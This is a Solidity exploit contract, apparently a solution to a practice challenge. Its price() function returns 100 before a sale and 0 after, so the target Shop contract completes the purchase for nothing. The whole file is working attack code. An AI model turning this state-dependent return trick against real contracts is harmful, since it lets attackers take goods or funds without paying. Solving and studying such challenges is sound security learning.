// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract IShop {
  uint256 public price = 100;
  bool public isSold;

  function buy() public virtual;
}

contract ShopSolution {
  bool public priceCalled = false;
  IShop shop;

  constructor(address _shopAddress) {
    shop = IShop(_shopAddress);
  }

  function price() external view returns (uint) {
    //bytes memory sig = abi.encodeWithSignature("isSold()");
    //(bool success, bytes memory data) = address(0x60aCC66885a634345063A807F9622ED0f318bE4A).call(sig);
    if (shop.isSold() == false) {
      return 100;
    }
    return 0;
  }

  function run() external {
    shop.buy();
  }
}